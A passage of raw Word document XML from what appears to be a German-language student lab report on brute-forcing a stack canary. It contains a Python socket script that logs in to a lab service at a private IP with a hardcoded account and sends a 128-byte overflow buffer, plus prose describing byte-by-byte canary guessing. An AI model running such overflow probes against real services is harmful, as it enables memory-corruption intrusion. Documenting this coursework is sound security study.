                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>def main():</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A1DC3E0" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="72F05697" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    IP_FH = '10.105.21.174'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0936E67B" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    IP_MARTIN = '10.0.2.22'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A34A778" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    IP = IP_FH</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71097591" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    PORT = 8080</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12F026C0" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    BUFFE_SIZE = 4096</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="220B5CF5" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="28F9E83D" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    login = 'cs19m050:cs19m050' + '\n'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="164F3FB5" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = 'u ' + 'A'*128 + 'a'*1 + '\n'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="794BCA88" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    exit = 'e' + '\n'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BA5C40E" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="515F48A4" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F72A9A6" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.settimeout(0.5)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CE3189F" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    connect = s.connect((IP, PORT))  # hardcoded IP address</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F348B5E" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    time.sleep(0.5)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DD35584" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    res1 = s.recv(BUFFE_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F845D8D" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print(res1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1405D7B2" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3F3089AD" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    #login with username</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="441E8CA9" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(login)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63070EED" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    res3 = s.recv(BUFFE_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20D48AA4" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print (res3)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14D788AD" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="2BA3192F" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(buffer)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B09ECBA" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    res4_1 = s.recv(BUFFE_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36CB6E71" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print('res4_1', res4_1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3558BAD8" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(exit)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2804C97C" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    res5 = s.recv(BUFFE_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AB26BCB" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    res6 = s.recv(BUFFE_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09DE2B1C" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print('res5', res5)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B2874EA" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print('res6', res6)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A1A0122" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    result = checkResponse(res5+res6)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62AA642B" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print result</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DD1B843" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3196B8BC" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="00B47CB9" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>s.close()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E39C854" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="00B47CB9" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="2F8F9815" w14:textId="09C73C06" w:rsidR="00764E77" w:rsidRPr="00B47CB9" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>main()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00764E77" w:rsidRPr="00B47CB9" w14:paraId="4A7DF480" w14:textId="77777777" w:rsidTr="00764E77">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0F019356" w14:textId="7FF74888" w:rsidR="00764E77" w:rsidRPr="00B47CB9" w:rsidRDefault="000C3276" w:rsidP="00944226">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Canary_1.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4BDB12B9" w14:textId="77777777" w:rsidR="00764E77" w:rsidRPr="00B47CB9" w:rsidRDefault="00764E77" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D21D6F5" w14:textId="1C2452C5" w:rsidR="00BB72C2" w:rsidRPr="00B47CB9" w:rsidRDefault="00405F4C" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Mir ist während des </w:t>
      </w:r>
      <w:r w:rsidR="00AC7012" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Debuggings</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> aufgefallen, dass </w:t>
      </w:r>
      <w:r w:rsidR="00AC7012" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">der Response vom Senden des Buffers hin und wieder in </w:t>
      </w:r>
      <w:r w:rsidR="001C53FC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>zwei Teile aufgesplittet war. Daher entschied ich mich diese zusammenzufügen</w:t>
      </w:r>
      <w:r w:rsidR="00BB72C2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>. Das Resultat der Konsole ist in der Abbildung ersichtlich.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38880B6F" w14:textId="2AA9F987" w:rsidR="00BB72C2" w:rsidRPr="00B47CB9" w:rsidRDefault="00BB72C2" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55D67101" w14:textId="78DCDB11" w:rsidR="00BB72C2" w:rsidRPr="00B47CB9" w:rsidRDefault="00BB72C2" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20E6AA31" wp14:editId="71744577">
            <wp:extent cx="4111142" cy="2749524"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="99" name="Grafik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123165" cy="2757565"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B7E5CE8" w14:textId="1B11BE24" w:rsidR="000C3276" w:rsidRPr="00B47CB9" w:rsidRDefault="00956C09" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Zwischenzeitlich wurde </w:t>
      </w:r>
      <w:r w:rsidR="00955100">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>noch ein Skript „canary_2.py entwickelt, um das erste Canary zu beschaffen.</w:t>
      </w:r>
      <w:r w:rsidR="009D5DA4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Dieses wurde der Vollständigkeit halber angehängt, ist aber als Zwischenschritt für die Dokumentation irrelevant.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795BCA97" w14:textId="5C30786D" w:rsidR="002D386D" w:rsidRPr="00B47CB9" w:rsidRDefault="00754A55" w:rsidP="00895B1F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Im nächsten Schritt </w:t>
      </w:r>
      <w:r w:rsidR="00A04F7E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">wurde das Skript so umgebaut, dass mit dem Funktionsaufruf </w:t>
      </w:r>
      <w:r w:rsidR="00A04F7E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">getCanary() </w:t>
      </w:r>
      <w:r w:rsidR="00022523" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">der aktuelle Buffer übergeben wird. Der Buffer setzt sich zusammen aus </w:t>
      </w:r>
      <w:r w:rsidR="00E8257C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">den 128 A’s und den gefundenen canaries. Es gibt also insgesamt 4 </w:t>
      </w:r>
      <w:r w:rsidR="00395D28" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="00E8257C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">urchläufe, </w:t>
      </w:r>
      <w:r w:rsidR="00395D28" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>innerhalb Schrittweise das einzelne canary ermittelt werden soll.</w:t>
      </w:r>
      <w:r w:rsidR="004F56DE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Innerhalb eines Durchlaufs wird </w:t>
      </w:r>
      <w:r w:rsidR="00454F79" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>eine Schleife ausgeführt. Für jeden Durchang wird d</w:t>
      </w:r>
      <w:r w:rsidR="00A65E55" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>er Index des Durchangs an den an die Funktionen übergebenen Wert angehängt und an die Anwendung gesendet.</w:t>
      </w:r>
      <w:r w:rsidR="00395D28" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004F56DE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Das volle Skript canary_3.py ist in der folgenden Tabelle ersichtlich:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A04F7E" w:rsidRPr="00B47CB9" w14:paraId="2F457285" w14:textId="77777777" w:rsidTr="00A04F7E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B40B0DA" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#!/usr/bin/python</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BCD6273" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import socket</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4146CC04" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import time</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="540D8134" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="25229A3C" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3B83AA51" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>def checkResponse(res):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4529B9F2" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    time.sleep(0.5)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CCF4E8E" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    badRes = 'RED'</w:t>
            </w:r>
          </w:p>
